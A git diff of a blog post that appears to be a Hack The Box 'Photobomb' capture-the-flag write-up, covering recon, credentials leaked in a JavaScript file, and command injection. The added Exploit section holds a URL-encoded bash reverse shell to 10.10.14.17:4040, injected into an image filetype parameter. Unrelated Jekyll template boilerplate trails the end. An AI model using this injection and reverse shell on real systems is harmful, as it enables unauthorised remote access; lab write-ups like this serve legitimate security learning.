@@ -17,14 +17,14 @@ image:
 ---
 ## Recognizement
 
-Before to start we have to view if the machine is active
+Before to start we have to view if the machine is active throutgh **ICMP** ping.
 
 ```console
  ping -c 1 10.10.11.182
-                 ------------ ----------
+ --------
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 181.901/181.901/181.901/0.000 ms
-                 ------------ ----------
+---------
 ```
 
 ### Nmap
@@ -49,12 +49,18 @@ How we can see the `port 80` is open so we are going to the domain [**https://ph
 
 ![HTB Img](/assets/img//HTB/EASY/panel.png)
 
+---
+
+## Enumeration
+
 Seeying the web-page index we have to click on `click here!` and it'll appear that credentials panel
 
 ![HTB Img](/assets/img//HTB/EASY/admin-psw.png)
 
-So researched on the page on **Networks** tools the pages tries to load afile called `photobomb.js`, so going to the file,
-we can see the following information 
+So researched on the page on **Networks** tools, the pages tries to load a file called `photobomb.js`, so going to that file
+![HTB Img](/assets/img//HTB/EASY/network.png)
+
+And we can see the following information:
 
 ![HTB Img](/assets/img//HTB/EASY/information-diclosed.png)
 
@@ -64,6 +70,8 @@ With that credentials are we can trying to write it on credentials panel
 ![HTB Img](/assets/img//HTB/EASY/admin-main.png)
 
 Soo.. we are admin **('-')**
+
+---
 
 ## Exploit
 
@@ -77,6 +85,15 @@ So in this panel tell us that we are unable to download any picture from this pa
 so with that, send it to repeater for start to test 
 
 ![HTB Img](/assets/img//HTB/EASY/repeater.png)
+
+verify the response with a 500 code **Internal Server Error** we are going to test if it works to do a [**reverse shell**], on filetype parameter we are put to next to `jpg` adding `;` and write the next reverse shell *(PD: encoded on url because we'll have an error from the syntaxis)* on my case I'll use from *bash* method with **Netcat** listener
+
+```console
+bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.17%2F4040%200%3E%261
+
+```
+> You can see others methods from this [**web**](https://sentrywhale.com/documentation/reverse-shell) :D.
+{: .prompt-tip }
 
 Create a new file named `YYYY-MM-DD-TITLE.EXTENSION`{: .filepath} and put it in the `_posts`{: .filepath} of the root directory. Please note that the `EXTENSION`{: .filepath} must be one of `md`{: .filepath} and `markdown`{: .filepath}. If you want to save time of creating files, please consider using the plugin `Jekyll-Compose`(https://github.com/jekyll/jekyll-compose) to accomplish this.
 
